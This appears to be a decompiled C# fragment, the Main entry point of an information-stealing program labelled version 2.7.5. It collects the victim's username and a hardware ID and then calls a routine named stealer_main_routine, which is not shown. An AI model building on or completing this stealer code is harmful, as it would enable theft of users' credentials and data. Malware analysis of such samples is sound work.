using System;
using System.Windows.Forms;

// Token: 0x02000005 RID: 5
internal static class Class3
{
	// Token: 0x06000003 RID: 3 RVA: 0x000022DD File Offset: 0x000004DD
	private static void Main()
	{
		Class2.windows_username = Environment.UserName;
		Class2.version = "2.7.5";
		Class2.hwid = Class5.get_guid();
		Class9.stealer_main_routine();
		Application.Exit();
	}
}
